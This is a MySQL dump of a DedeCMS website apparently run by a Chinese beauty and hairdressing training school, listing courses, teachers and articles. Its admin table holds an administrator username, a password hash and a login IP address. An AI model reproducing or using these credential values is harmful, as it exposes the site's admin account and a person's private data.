/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_admin` (
  `id` int(10) unsigned NOT NULL,
  `usertype` float unsigned DEFAULT '0',
  `userid` char(30) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `uname` char(20) NOT NULL DEFAULT '',
  `tname` char(30) NOT NULL DEFAULT '',
  `email` char(30) NOT NULL DEFAULT '',
  `typeid` text,
  `logintime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginip` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_admin`
--

LOCK TABLES `dede_admin` WRITE;
/*!40000 ALTER TABLE `dede_admin` DISABLE KEYS */;
INSERT INTO `dede_admin` VALUES (1,10,'hqxuexiao','fe5f8008db984a2f1fc8','admin','','','0',1571306979,'39.149.1.41');
/*!40000 ALTER TABLE `dede_admin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_admintype`
--

DROP TABLE IF EXISTS `dede_admintype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_admintype` (
  `rank` float NOT NULL DEFAULT '1',
  `typename` varchar(30) NOT NULL DEFAULT '',
  `system` smallint(6) NOT NULL DEFAULT '0',
  `purviews` text,
  PRIMARY KEY (`rank`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_admintype`
--

LOCK TABLES `dede_admintype` WRITE;
/*!40000 ALTER TABLE `dede_admintype` DISABLE KEYS */;
INSERT INTO `dede_admintype` VALUES (1,'信息发布员',1,'t_AccList a_AccNew a_AccList a_MyList a_MyEdit a_MyDel sys_MdPwd sys_Feedback sys_MyUpload plus_留言簿模块 '),(5,'频道管理员',1,'t_AccList t_AccNew t_AccEdit t_AccDel a_AccNew a_AccList a_AccEdit a_AccDel a_AccCheck a_MyList a_MyEdit a_MyDel a_MyCheck co_AddNote co_EditNote co_PlayNote co_ListNote co_ViewNote spec_New spec_List spec_Edit sys_MdPwd sys_Log sys_ArcTj sys_Source sys_Writer sys_Keyword sys_MakeHtml sys_Feedback sys_Upload sys_MyUpload member_List member_Edit plus_站内新闻发布 plus_友情链接模块 plus_留言簿模块 plus_投票模块 plus_广告管理 '),(10,'超级管理员',1,'admin_AllowAll ');
/*!40000 ALTER TABLE `dede_admintype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_advancedsearch`
--

DROP TABLE IF EXISTS `dede_advancedsearch`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_advancedsearch` (
  `mid` int(11) NOT NULL,
  `maintable` varchar(256) NOT NULL DEFAULT '',
  `mainfields` text,
  `addontable` varchar(256) DEFAULT NULL,
  `addonfields` text,
  `forms` text,
  `template` varchar(256) NOT NULL DEFAULT '',
  UNIQUE KEY `mid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_advancedsearch`
--

LOCK TABLES `dede_advancedsearch` WRITE;
/*!40000 ALTER TABLE `dede_advancedsearch` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_advancedsearch` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_arcatt`
--

DROP TABLE IF EXISTS `dede_arcatt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_arcatt` (
  `sortid` smallint(6) NOT NULL DEFAULT '0',
  `att` char(10) NOT NULL DEFAULT '',
  `attname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`att`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_arcatt`
--

LOCK TABLES `dede_arcatt` WRITE;
/*!40000 ALTER TABLE `dede_arcatt` DISABLE KEYS */;
INSERT INTO `dede_arcatt` VALUES (5,'s','滚动'),(1,'h','头条'),(3,'f','幻灯'),(2,'c','推荐'),(7,'p','图片'),(8,'j','跳转'),(4,'a','特荐'),(6,'b','加粗'),(9,'k','课程'),(10,'o','实操'),(11,'z','作品'),(12,'x','资讯'),(13,'w','服务或证书');
/*!40000 ALTER TABLE `dede_arcatt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_arccache`
--

DROP TABLE IF EXISTS `dede_arccache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_arccache` (
  `md5hash` char(32) NOT NULL DEFAULT '',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `cachedata` mediumtext,
  PRIMARY KEY (`md5hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_arccache`
--

LOCK TABLES `dede_arccache` WRITE;
/*!40000 ALTER TABLE `dede_arccache` DISABLE KEYS */;
INSERT INTO `dede_arccache` VALUES ('f298c34a4aca663af3be68e65ef16d02',1569861110,'82,81,80,79'),('6af92f35e4fd491f1220f1fe8977556b',1569861110,'54,53'),('0266b90d2c71b884af12e396ccf41a3d',1569861110,'86,85,84,83'),('ac9a13b9c69c44937038cf6a2eb685fb',1569861109,'48,47'),('1de9c0b1d82949c09f03d2748f24ac58',1569861108,'74,73,19'),('3e82b333f7b01615fb08f8e5df3601e1',1569861108,'65'),('e3c40999550016f9110ca53d6c8edee5',1569861108,'93,92,91,78,77,76'),('f8d042619705d0821e40c51664bbd82e',1569861108,'101,97,16,17'),('bd4461760c0d963a16428763c658504a',1569861106,'96,95,72,71,70,14'),('f1b3c47336b7d9bdc017dd0d94432f37',1569861106,'10,52,51,49,50'),('ed87e97352e1adee5fdb80a3bd75fe9f',1569861106,'68,11,61,62,63,64'),('b57a5834622b45f730c5fd1de4286191',1569861106,'6,7,8'),('b8cde18c30a54fbd8d414d5d8cf029ed',1569861105,'94,69,22,24,23,34'),('85585e4639d5b7b786ac90eaeeb58194',1569861105,'44,42,59,41'),('734f085fabb8f90375192396e147c18c',1569861105,'35,36,37,38,39,40'),('3b23be185e15d4cefd7676653b9e44b8',1569861105,'3,5,43,4');
/*!40000 ALTER TABLE `dede_arccache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_archives`
--

DROP TABLE IF EXISTS `dede_archives`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_archives` (
  `id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid2` varchar(90) NOT NULL DEFAULT '0',
  `sortrank` int(10) unsigned NOT NULL DEFAULT '0',
  `flag` set('c','h','p','f','s','j','a','b','k','o','z','x','w') DEFAULT NULL,
  `ismake` smallint(6) NOT NULL DEFAULT '0',
  `channel` smallint(6) NOT NULL DEFAULT '1',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `click` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `money` smallint(6) NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `shorttitle` char(36) NOT NULL DEFAULT '',
  `color` char(7) NOT NULL DEFAULT '',
  `writer` char(20) NOT NULL DEFAULT '',
  `source` char(30) NOT NULL DEFAULT '',
  `litpic` char(100) NOT NULL DEFAULT '',
  `pubdate` int(10) unsigned NOT NULL DEFAULT '0',
  `senddate` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `keywords` char(30) NOT NULL DEFAULT '',
  `lastpost` int(10) unsigned NOT NULL DEFAULT '0',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `goodpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `badpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `voteid` mediumint(8) NOT NULL,
  `notpost` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `description` varchar(255) NOT NULL DEFAULT '',
  `filename` varchar(40) NOT NULL DEFAULT '',
  `dutyadmin` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tackid` int(10) NOT NULL DEFAULT '0',
  `mtype` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `weight` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`),
  KEY `mainindex` (`arcrank`,`typeid`,`channel`,`flag`,`mid`),
  KEY `lastpost` (`lastpost`,`scores`,`goodpost`,`badpost`,`notpost`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_archives`
--

LOCK TABLES `dede_archives` WRITE;
/*!40000 ALTER TABLE `dede_archives` DISABLE KEYS */;
INSERT INTO `dede_archives` VALUES (2,2,'0',1550744356,'p,a',1,1,-2,80,0,'美容课程测试1美容课程测试1美容课程测试1','美容课程测试1','','admin','未知','/uploads/allimg/190221/1-1Z2211P4030-L-lp.jpg',1550744356,1550743543,1,'美容,课程,测试,美容,课程,测试,',0,0,0,0,0,0,'美容课程测试1摘要美容课程测试1摘要美容课程测试1摘要','',1,0,0,0),(3,2,'0',1551709353,'p,k',1,1,0,766,0,'美容院实战班','美容院实战班','','admin','未知','/uploads/190227/1903/1-1Z3022109302M.jpg',1551709353,1550751122,1,'美容院,实战,班,学期,45--60天,专业,护肤,课程,',0,0,0,0,0,0,'学期：45--60天 专业护肤： 课程内容：由基础课程开始讲起，包括肌肤护理的初、中、高级全套内容。美容概述、皮肤生理学、皮肤护理学、国际通用的洗面、按摩手法。全身按摩、面','',1,0,0,1),(4,2,'0',1551705807,'p,k',1,1,0,5342,0,'美容全能班','美容全能班','','admin','未知','/uploads/190227/1903/1-1Z302210ZM19.jpg',1551705807,1550751854,1,'美容,全能,班,学期,六个月,专业,护肤,课程,',0,0,0,0,0,0,'学期：六个月 a.专业护肤： 课程内容：由基础课程开始讲起，包括肌肤护理的初、中、高级全套内容。美容概述、皮肤生理学、皮肤护理学、国际通用的洗面、按摩手法。全身按摩、面','',1,0,0,2),(5,2,'0',1551707228,'p,k',1,1,0,4315,0,'美容精英班','美容精英班','','admin','未知','/uploads/190227/1903/1-1Z302210SDN.jpg',1551707228,1550751900,1,'美容,精英,班,学期,四个月,专业,护肤,课程,',0,0,0,0,0,0,'学期：四个月 专业护肤： 课程内容：由基础课程开始讲起，包括肌肤护理的初、中、高级全套内容。美容概述、皮肤生理学、皮肤护理学、国际通用的洗面、按摩手法。全身按摩、面','',1,0,0,3),(6,8,'0',1555738538,'c,h,p,a,k',1,1,0,5823,0,'美发全科班','美发全科班','','admin','未知','/uploads/1903/1-1Z303154042L1.jpg',1555738538,1550752116,1,'美发,精英,班,学期,时长,四个月,专业,美发,班,',0,0,0,0,0,0,'学期时长四个月 专业美发班：发廊的全套服务流程。服务礼仪、交流技巧、服务细节、洗发课程，躺洗、水洗、干洗、泰式洗发、台湾三温暖洗发。头部及肩、颈、背等半身按摩课程。','',1,0,0,4),(7,8,'0',1551707680,'c,h,p,a,k',1,1,0,785,0,'中工升发型师班','中工升发型师班','','admin','未知','/uploads/1903/1-1Z30315395b55.jpg',1551707680,1550752157,1,'中工升,发型师,班,学期,45--60天,专业,美发,班,',0,0,0,0,0,0,'学期：45--60天 专业美发班：发廊的全套服务流程。服务礼仪、交流技巧、服务细节、洗发课程，躺洗、水洗、干洗、泰式洗发、台湾三温暖洗发。头部及肩、颈、背等半身按摩课程。从','',1,0,0,5),(8,8,'0',1551707549,'c,h,p,a,k',1,1,0,567,0,'美发店长班（技术总监班）','美发店长班（技术总监班）','','admin','未知','/uploads/1903/1-1Z30315392QB.jpg',1551707549,1550752228,1,'美发,店长,班,技术,总监,学期,六个月,专业,',0,0,0,0,0,0,'学期：六个月 专业美发班：发廊的全套服务流程。服务礼仪、交流技巧、服务细节、洗发课程，躺洗、水洗、干洗、泰式洗发、台湾三温暖洗发。头部及肩、颈、背等半身按摩课程。从','',1,0,0,6),(9,10,'0',1550752241,'c,h,s,a,z',1,1,-2,203,0,'美发作品1','','','admin','未知','',1550752241,1550752269,1,'美发,作品,',0,0,0,0,0,0,'','',1,0,0,7),(10,10,'0',1551880219,'c,h,p,s,a,z',1,1,0,153,0,'美发造型作品','美发造型作品','','admin','未知','/uploads/1903/1-1Z30621510a05.jpg',1551880219,1550752318,1,'美发,作品,',0,0,0,0,0,0,'','',1,0,0,8),(11,11,'0',1551881749,'p,f,x',1,1,0,2698,0,'简单易学的剪发技巧：五点定位剪法','简单易学的剪发技巧：五点定','','admin','未知','/uploads/190221/1903/1-1Z306221606151.jpg',1551881749,1550752398,1,'简单,易学的,易,学的,剪发,技巧,五点,定位,',0,0,0,0,0,0,'如何快速提高发型修剪的水平，是每个初学者最关心的话题。为了帮助大家尽快学习和掌握发型修剪技术，提高剪发的速度以及剪发的准确度，以下是一套简单易学的剪发技巧，希望对','',1,0,0,9),(12,11,'0',1551881730,'p,f',1,1,0,166,0,'新手学理发基本步骤 哪些技巧要掌握','新手学理发基本步骤 哪些技巧','','admin','未知','/uploads/190221/1903/1-1Z306221540J8.jpg',1551881730,1550752415,1,'新手,学,理发,基本,步骤,哪些,技巧,要,掌握,',0,0,0,0,0,0,'第一，工具的使用要熟练 新手学理发基本步骤的第一步就是要掌握如何使用工具，其中包括了、吹、剪、烫等所用到的工具。这其中，以剪头发为重要的一个环节，需要从如何拿工具到','',1,0,0,10),(13,11,'0',1551881710,'p,f',1,1,0,154,0,'美发师剪发小技巧 剪发操作小技巧','美发师剪发小技巧','','admin','未知','/uploads/190221/1903/1-1Z306221520311.jpg',1551881710,1550752438,1,'美发师,剪发,小,技巧,操作,美发师,剪发,小,',0,0,0,0,0,0,'美发师剪发小技巧 夹剪的操作技巧主要有以下几点 ①夹剪时手指夹住头发的部位，确定留发的长度。 ②夹起的每股头发要平直，夹剪的每股头发要注意相互衔接，即要注意夹起每股头','',1,0,0,11),(14,9,'0',1551878823,'c,h,p,s,o',1,1,0,172,0,'美发老师指导练习','美发老师指导练习','','admin','未知','/uploads/1903/1-1Z306212R2915.jpg',1551878823,1550752630,1,'2018年,3月,美发,初级班,实操,作品,',0,0,0,0,0,0,'','',1,0,0,12),(15,9,'0',1551878708,'c,h,p,s,o',1,1,0,93,0,'美发学员烫染练习','美发学员烫染练习','','admin','未知','/uploads/1903/1-1Z30621260W20.jpg',1551878708,1550752660,1,'2018年,美发,2期,学员,实操,',0,0,0,0,0,0,'','',1,0,0,13),(16,14,'0',1564452489,'p,k',1,1,0,4607,0,'影楼新娘跟妆课程','影楼新娘跟妆课程','','admin','未知','/uploads/1903/1-1Z303160JV29.jpg',1564452489,1550752846,1,'影楼,新娘,跟妆,课程,学费,是,2880元,45天,时间,',0,0,0,0,0,0,'学费是2880元，45天时间，新娘妆，写真妆，婚纱套系，古妆套系等等三十款妆面。','',1,0,0,14),(17,14,'0',1551882952,'p,k',1,1,0,378,0,'化妆晚装精英班','化妆晚装精英班','','admin','未知','/uploads/1903/1-1Z303155S5Y3.jpg',1551882952,1550752902,1,'化妆,晚装,精英,班,学期,四个月,化妆,课程,',0,0,0,0,0,0,'学期：四个月 a.化妆课程：讲授唯美化妆课程，面部结构，面部人体骨骼学，肌肉年龄走向学，妆面年龄的对比与矫正，包括素描、基面、基点化妆。教学内容密切结合市场需求和流行','',1,0,0,15),(18,14,'0',1551617992,'c,h,p,a,k',1,1,0,429,0,'化妆晚装整体形象设计','化妆晚装整体形象设计','','admin','未知','/uploads/1903/1-1Z303155I6451.jpg',1551617992,1550752936,1,'化妆,晚装,整体,形象设计,学期,六个月,化妆,',0,0,0,0,0,0,'学期：六个月 a.化妆课程：讲授唯美化妆课程，面部结构，面部人体骨骼学，肌肉年龄走向学，妆面年龄的对比与矫正，包括素描、基面、基点化妆。教学内容密切结合市场需求和流行','',1,0,0,16),(19,15,'0',1551882994,'p,o',1,1,0,170,0,'化妆学员上课实景','化妆学员上课实景','','admin','未知','/uploads/190221/1903/1-1Z306223R1W0.jpg',1551882994,1550752998,1,'学,员考试,作品,中式,新娘,整体,造型,',0,0,0,0,0,0,'','',1,0,0,17),(21,34,'0',1550753894,'',1,1,-2,152,0,'联系我们','联系我们','','admin','未知','',1550753894,1550753885,1,'联系,我们,联系,我们,',0,0,0,0,0,0,'联系我们','',1,0,0,18),(22,3,'0',1551878383,'c,h,p,s,o',1,1,0,181,0,'面部美容实操','面部美容实操','','admin','未知','/uploads/1903/1-1Z306211924456.jpg',1551878383,1550758424,1,'美容美体,学员,一对一,实操,美容美体,学员,',0,0,0,0,0,0,'美容美体学员一对一实操','',1,0,0,19),(23,3,'0',1551878221,'c,h,p,s,o',1,1,0,125,0,'面部美容练习','面部美容练习','','admin','未知','/uploads/1903/1-1Z306211A13A.jpg',1551878221,1550758448,1,'美容美体,学员,一对一,实操,美容美体,学员,',0,0,0,0,0,0,'美容美体学员一对一实操','',1,0,0,20),(24,3,'0',1551878323,'c,h,p,s,o',1,1,0,163,0,'美容学员练习','美容学员练习','','admin','未知','/uploads/1903/1-1Z3062114552H.jpg',1551878323,1550758474,1,'美容美体,学员,一对一,实操,美容美体,学员,',0,0,0,0,0,0,'美容美体学员一对一实操','',1,0,0,21),(69,3,'0',1551878504,'c,h,p,s,o',1,1,0,218,0,'半永久美容考核','半永久美容考核','','admin','未知','/uploads/1903/1-1Z30621210c55.jpg',1551878504,1551878481,1,'半,永久,美容,考核,',0,0,0,0,0,0,'','',1,0,0,66),(25,25,'0',1550909133,'c,h,p',1,1,0,151,0,'美发老师—Give','美发老师—Give','','admin','未知','/uploads/allimg/190223/1-1Z22315410I92.jpg',1550909133,1550907716,1,'美发,老师,—,Give,姓名,马嵘达,Give,个人简历,',0,0,0,0,0,0,'姓名:马嵘达Give 个人简历： 2003年妍修TONIgGuY经典劳技 2004年妍修沙宣经典当代選程 2005年黑加仑鬼剪高级导师 2007年托尼盖美发高级顾问,美容美发协会高级评委 2008年江苏南京南茜学院教','',1,0,0,22),(26,25,'0',1550909184,'c,h,p',1,1,0,238,0,'美甲老师-金妍','美甲老师-金妍','','admin','未知','/uploads/allimg/190223/1-1Z2231606345V.jpg',1550909184,1550909256,1,'美甲,老师,金妍,',0,0,0,0,0,0,'','',1,0,0,23),(27,25,'0',1550909299,'c,h,p',1,1,-2,197,0,'美发老师-欧阳','美发老师-欧阳','','admin','未知','/uploads/allimg/190223/1-1Z223160U12c.jpg',1550909299,1550909367,1,'美发,老师,欧阳,',0,0,0,0,0,0,'','',1,0,0,24),(28,25,'0',1550909383,'p',1,1,0,2637,0,'美发老师—孙向阳','美发老师—孙向阳','','admin','未知','/uploads/allimg/190223/1-1Z223160951101.jpg',1550909383,1550909426,1,'美发,老师,—,孙向阳,孙,向阳,',0,0,0,0,0,0,'','',1,0,0,25),(29,25,'0',1550909433,'c,h,p',1,1,0,2629,0,'美发老师—王慧勇','美发老师—王慧勇','','admin','未知','/uploads/allimg/190223/1-1Z223161041V9.jpg',1550909433,1550909483,1,'美发,老师,—,王慧,勇,',0,0,0,0,0,0,'','',1,0,0,26),(30,25,'0',1550909520,'p',1,1,0,2789,0,'化妆老师—邝程琳','化妆老师—邝程琳','','admin','未知','/uploads/allimg/190223/1-1Z223161209207.jpg',1550909520,1550909602,1,'化妆,老师,—,邝程,琳,',0,0,0,0,0,0,'','',1,0,0,27),(31,25,'0',1550909604,'p',1,1,0,2848,0,'美容老师—李亚伦','美容老师—李亚伦','','admin','未知','/uploads/allimg/190223/1-1Z223161333154.jpg',1550909604,1550909643,1,'美容,老师,—,李亚伦,',0,0,0,0,0,0,'','',1,0,0,28),(32,25,'0',1550909818,'p',1,1,0,3096,0,'化妆老师—赵凌凌','化妆老师—赵凌凌','','admin','未知','/uploads/allimg/190223/1-1Z223161412954.jpg',1550909818,1550909687,1,'化妆,老师,—,赵凌凌,',0,0,0,0,0,0,'','',1,0,0,29),(33,25,'0',1568616693,'p',0,1,-1,3080,0,'美发老师—吕连博','美发老师—吕连博','','admin','未知','/uploads/allimg/190223/1-1Z22316145M33.jpg',1568616693,1550909737,1,'美发,老师,—,吕连博,',0,0,0,0,0,0,'','',1,0,0,30),(34,3,'0',1551878036,'c,h,p,s,o',1,1,0,92,0,'美容学员实操','美容学员实操','','admin','未知','/uploads/1903/1903/1-1Z30621130b24.jpg',1551878036,1550914819,1,'美容,学员,实操,',0,0,0,0,0,0,'','',1,0,0,31),(35,4,'0',1551880887,'c,h,p,z',1,1,0,234,0,'腰部按摩','腰部按摩','','admin','未知','/uploads/1903/1-1Z306220141M2.jpg',1551880887,1550919983,1,'美容,腰部,按摩,',0,0,0,0,0,0,'','',1,0,0,32),(38,4,'0',1551877531,'c,h,p,b,z',1,1,0,169,0,'艾灸美容','艾灸美容','','admin','未知','/uploads/1903/1-1Z30621051D56.jpg',1551877531,1550920161,1,'艾灸,美容,',0,0,0,0,0,0,'艾灸材料产艾热刺激体表穴位或特定部位，通过激发经气的活动来调整人体紊乱的生理生化功能，从而达美容养生的目的','',1,0,0,35),(36,4,'0',1551880803,'c,h,p,b,z',1,1,0,122,0,'头部按摩','头部按摩','','admin','未知','/uploads/1903/1-1Z306220041213.jpg',1551880803,1550920066,1,'美容,头部,按摩,',0,0,0,0,0,0,'','',1,0,0,33),(37,4,'0',1551877564,'c,h,p,b,z',1,1,0,149,0,'背部美容','背部美容','','admin','未知','/uploads/1903/1-1Z306210643932.jpg',1551877564,1550920104,1,'背部,美容,',0,0,0,0,0,0,'','',1,0,0,34),(39,4,'0',1551877223,'c,h,p,b,z',1,1,0,110,0,'美容刮痧','美容刮痧','','admin','未知','/uploads/1903/1-1Z306210001492.jpg',1551877223,1550920185,1,'美容,刮痧,',0,0,0,0,0,0,'刮痧 美容则是运用刮痧的方法，在人的脸上或身体上进行刮拭，以改变人的容颜或形体的方法','',1,0,0,36),(40,4,'0',1551876814,'c,h,p,b,z',1,1,0,179,0,'美容护肤','美容护肤','','admin','未知','/uploads/1903/1-1Z306205055D3.jpg',1551876814,1550920221,1,'美容护肤,',0,0,0,0,0,0,'美容护肤 美容护肤是指通过某些方法和习惯达到美容加护肤的效果','',1,0,0,37),(41,5,'0',1551880980,'c,h,p,x',1,1,0,136,0,'美容师必学的皮肤美容知识','美容师必学的皮肤美容知识','','admin','未知','/uploads/1903/1-1Z306220041213.jpg',1551880980,1550920496,1,'美容师,必,学的,皮肤,美容,知识,美容师,想要,',0,0,0,0,0,0,'美容师想要针对不同顾客的皮肤等问题找出原因和对症施药，就需要知道一些皮肤的基础美容知识，这样才能实实在在的为顾客解除烦恼，接下来就一起来看看美容师必学的皮肤美容知','',1,0,0,38),(42,5,'0',1551881097,'c,h,p,f,x',1,1,0,156,0,'美容护肤的五大步骤','美容护肤的五大步骤','','admin','未知','/uploads/1903/1-1Z306205055D3.jpg',1551881097,1550920606,1,'美容护肤,的,五大,步骤,没有规矩,不成方圆,',0,0,0,0,0,0,'没有规矩不成方圆，美容护肤也要讲究方法，遵守一定的规律。日常护肤有哪几个步骤？使用护肤品的顺序是什么呢？周末一定要系统护肤吗？卸妆真的很重要？下面让我们来一一解答','',1,0,0,39),(43,2,'0',1551706625,'c,h,p,a,k',1,1,0,569,0,'皮肤基础班课程','皮肤基础班课程','','admin','未知','/uploads/190223/190223/1-1Z22319345WY.jpg',1551706625,1550921709,1,'皮肤,基础,班,课程,课程,介绍,国际标准,、,',0,0,0,0,0,0,'课程介绍： 国际标准、职业素养、职业道德，美容基础技能和相关的理论知识，皮肤的生理知识，头部、面部、肩颈部、背部的按摩手法，面膜的分类和使用，还包含皮肤管理基础护理','',1,0,0,40),(44,5,'0',1551881954,'c,h,p,f,x',1,1,0,2744,0,'新手美容师必知的销售技巧','新手美容师必知的销售技巧','','admin','未知','/uploads/190221/1903/1-1Z3062219311P.jpg',1551881954,1550925678,1,'新手,美容师,必知,的,销售,技巧,新手,美容师,',0,0,0,0,0,0,'新手美容师一般都要经过严格的培训才能进行上岗服务，究竟美容师培训 需要注意哪些呢？ 1、不可采取命令和批示的口吻与人交谈 新手美容师在与顾客交谈时，微笑再展露一点，态度','',1,0,0,41),(45,28,'0',1550990337,'c,h,p,a',1,1,0,237,0,'学校前台','学校前台','','admin','未知','/uploads/allimg/190224/1-1Z224143629140-lp.jpg',1550990337,1550990239,1,'学校,前台,',0,0,0,0,0,0,'','',1,0,0,42),(46,29,'0',1552534376,'c,h,p',0,1,-1,110,0,'学校资质','学校资质','','admin','未知','/uploads/allimg/190224/1-1Z22414402G60-lp-lp.jpg',1552534376,1550990463,1,'学校,资质,',0,0,0,0,0,0,'','',1,0,0,43),(47,20,'0',1551618546,'p,k',1,1,0,344,0,'美甲基础课程','美甲基础课程','','admin','未知','/uploads/1903/1-1Z303210TS45.jpg',1551618546,1551002004,1,'美甲,基础,课程,专业,介绍,学时,1个,半月,',0,0,0,0,0,0,'专业介绍 学时:1个半月 适合人群:适合没有美甲基础、投入学习时间短暂，短时间内了解美甲店铺技师的全面技术、开设专业美甲沙龙店铺、考取国家劳动局高级美甲师资格证、学成后','',1,0,0,44),(48,20,'0',1554046388,'p,k',1,1,0,4637,0,'美甲全科课程','美甲全科课程','','admin','未知','/uploads/1903/1-1Z30321055W19.jpg',1554046388,1551002247,1,'美甲,中级,课程,彩绘,知识,新产品,工具,介绍,',0,0,0,0,0,0,'彩绘知识： 新产品工具介绍、工具材料的准备、手绘工具材料的介绍和使用方法、色彩的重要性、概念及色彩不同的分类方式、色彩混合、色彩的搭配、色调的组织及调和原理、初级彩','',1,0,0,45),(49,10,'0',1551879766,'h,p,s,a,z',1,1,0,61,0,'美发染色作品','美发染色作品','','admin','未知','/uploads/1903/1-1Z30621440CW.jpg',1551879766,1551185561,1,'美发,作品,',0,0,0,0,0,0,'','',1,0,0,46),(50,10,'0',1551879659,'h,p,s,a,z',1,1,0,139,0,'洗吹造型作品','洗吹造型作品','','admin','未知','/uploads/1903/1-1Z306214215939.jpg',1551879659,1551185583,1,'美发,作品,',0,0,0,0,0,0,'','',1,0,0,47),(51,10,'0',1551880033,'h,p,s,a,z',1,1,0,118,0,'美发色彩作品','美发色彩作品','','admin','未知','/uploads/1903/1-1Z306214H3417.jpg',1551880033,1551185615,1,'美发,作品,',0,0,0,0,0,0,'','',1,0,0,48),(52,10,'0',1551880191,'h,p,a,z',1,1,0,106,0,'美发精剪造型','美发精剪造型','','admin','未知','/uploads/1903/1-1Z306213G9146.jpg',1551880191,1551185631,1,'美发,作品,',0,0,0,0,0,0,'','',1,0,0,49),(53,23,'0',1551363991,'h,p,x',1,1,0,132,0,'美甲师需要哪些职业技能','美甲师需要哪些职业技能','','admin','未知','/uploads/allimg/20190228/1551363975827268-lp.jpg',1551363991,1551363930,1,'美甲,师,需要,哪些,职业技能,作为,时尚,行业,',0,0,0,0,0,0,'作为时尚行业中的一员，美甲师应当具备何种职业技能呢？作为美的缔造者，作为时尚的引领者，美甲师当然是必须具备一些特有的技能与素养，那么成为专业的美甲师需要有什么样的','',1,0,0,50),(54,23,'0',1551364056,'h,p,x',1,1,0,70,0,'美甲师工资待遇高不高','美甲师工资待遇高不高','','admin','未知','/uploads/allimg/20190228/1551364148936692-lp.jpg',1551364056,1551364177,1,'美甲,师,工资,待遇,高不高,高,不高,美甲,师,',0,0,0,0,0,0,'美甲师工资待遇怎么样?继美容师后，美甲师成为时下最热门的职业。由于美甲师入门门槛很低，所以很多女生学美甲没多久就当上了美甲师，但工资还是存在一些差异的，这是什么原因','',1,0,0,51),(55,28,'0',1551522703,'c,h,p,a',1,1,0,181,0,'环球学校教学环境','环球学校教学环境','','admin','未知','/uploads/allimg/20190302/1551522524875482-lp.jpg',1551522703,1551522534,1,'环球,学校,教学,环境,',0,0,0,0,0,0,'美容教室 化妆教室','',1,0,0,52),(56,6,'0',1551523136,'p',1,1,0,78,0,'美容资格证书','美容资格证书','','admin','未知','/uploads/allimg/20190302/1551523101100745-lp.jpg',1551523136,1551523127,1,'美容,资格,证书,国家,职业资格,证书,',0,0,0,0,0,0,'国家职业资格证书 中华人民共和国劳动法明确规定持证上岗，所谓就业准入是指根据《劳动法》和《职业教育法》的有关规定，对从事技术复杂、通用性广、涉及到国家财产、人民生命','',1,0,0,53),(57,12,'0',1551523295,'p',1,1,0,212,0,'美发资格证书','美发资格证书','','admin','未知','/uploads/allimg/20190302/1551523101100745-lp.jpg',1551523295,1551523465,1,'美发,资格,证书,美发,资格,证书考试,要点,',0,0,0,0,0,0,'美发资格证书考试要点： 基础知识 1 服务业务技术管理知识 美发岗位责任、服务规范要求及各项规章制度、服务质量标准和技术管理制度。 公共关系基本知识 2 美发行业卫生知识 店容','',1,0,0,54),(58,23,'0',1551524503,'',1,1,-2,53,0,'学习美甲须知的七个美甲技巧','学习美甲须知的七个美甲技巧','','admin','未知','',1551524503,1551523880,1,'学习,美甲,须知,的,七个,技巧,美甲,小,知识,',0,0,0,0,0,0,'美甲小知识一 指甲油的选色原则 亚洲人普遍都是比较偏黄的肤色，所以要谨慎选择灰色和黄色系的甲油，因为这样会使皮肤变得更加暗淡。 